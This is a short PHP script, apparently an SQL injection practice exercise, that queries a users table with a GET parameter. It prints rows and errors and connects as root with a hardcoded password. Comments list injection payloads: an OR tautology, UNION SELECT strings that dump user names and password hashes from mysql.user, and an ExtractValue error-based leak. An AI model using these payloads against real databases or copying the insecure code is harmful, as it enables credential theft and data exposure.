<?php

require_once 'libs/redirectFunctions.php';


echo $payload . "<br>";
$conn = new mysqli('db', 'root', '123', 'fstt23');
$payload = mysqli_real_escape_string(
    $conn,
    $_GET['payload']
);
$result = $conn->query("SELECT * FROM users WHERE username = '$payload'");


while ($row = $result->fetch_assoc()) {
    $first_name = $row['first_name'];
    $last_name = $row['last_name'];
    echo implode(" ", $row) . "<br>";
}
if ($conn->errno) {
    redirectToLogin("Login failed!");
    echo "Error: " . $conn->error;
}
// Arthur' OR 'a'='a'
// Arthur' UNION ALL SELECT user AS username, null AS id,
// password AS password,NULL FROM mysql.user -- -


// Arthur' UNION ALL SELECT user AS username, null AS id, password AS password,NULL FROM mysql.user -- -
// Arthur' UNION ALL SELECT user AS username, null AS id, authentication_string AS password_auth,NULL FROM mysql.user -- -


// Arthur' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -' 

// SELECT * FROM products WHERE name LIKE '%%'


$conn->close();
